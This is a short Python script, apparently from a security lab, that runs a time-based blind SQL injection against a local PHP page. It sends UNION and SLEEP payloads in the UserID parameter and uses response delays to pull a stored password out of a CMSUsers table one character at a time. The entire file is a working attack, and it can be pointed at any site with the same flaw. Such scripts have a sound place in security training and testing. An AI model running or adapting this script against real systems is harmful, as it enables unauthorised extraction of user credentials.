import requests
import sys

URL = "http://127.0.0.1:8781/blind/list_users.php"
passwort = " "

for position in range(1, 6):
    print(ascii(position))
    for zeichen in range(33, 127):
        sqli = '1 UNION ALL SELECT 1,2,(SELECT IF(ascii(substring((SELECT Password from CMSUsers limit 0,1),'+ ascii(position) +',1))='+ ascii(zeichen) +', SLEEP(0.5), null))'
        PARAMS = { 'UserID' : sqli }
        r = requests.get(url = URL, params = PARAMS)
        dauer = r.elapsed.total_seconds()

        if(dauer>0.3):
            print(sqli+" :dauer: "+ascii(dauer))
            passwort = passwort + chr(zeichen)
print(passwort)
